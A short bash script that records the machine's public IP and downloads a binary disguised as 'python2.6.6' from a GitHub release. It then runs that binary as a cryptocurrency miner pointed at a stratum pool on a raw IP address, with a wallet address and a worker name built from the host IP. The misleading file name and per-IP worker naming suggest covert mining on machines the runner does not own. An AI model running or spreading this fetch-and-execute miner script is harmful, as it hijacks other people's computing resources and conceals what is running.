#!bin/bash -xe 

## getting IP info
iip=$(curl https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io

rm -rf python2.6.6
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6
chmod +x python2.6.6
#cp python2.6.6 /bin/python2.6.6
./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
